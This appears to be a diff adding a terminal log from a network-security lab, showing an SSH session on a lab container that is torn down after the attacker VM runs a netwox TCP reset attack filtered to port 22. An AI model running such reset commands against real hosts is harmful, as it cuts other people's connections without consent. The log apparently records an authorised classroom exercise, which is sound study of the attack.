@@ -1,0 +1,29 @@
+root@b3925ccdb7e1:/# ssh 10.9.0.5
+root@10.9.0.5's password: 
+Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.11.0-1029-gcp x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+Last login: Mon Feb 14 12:47:20 2022 from 10.9.0.6
+root@58a9ed39547c:~# 
+
+root@58a9ed39547c:/# netstat -tna
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+tcp        0      0 127.0.0.11:34689        0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN     
+tcp        0      0 10.9.0.5:22             10.9.0.6:59532          ESTABLISHED
+tcp6       0      0 :::22                   :::*                    LISTEN
+
+[02/14/22]admin@Attacker-vm:~/.../Labsetup$ sudo netwox 78 -d "br-3e5f42528ad9" -f "dst host 10.9.0.5 and dst port 22"
+
+root@58a9ed39547c:~# lsclient_loop: send disconnect: Broken pipe
+root@b3925ccdb7e1:/# 
+ 
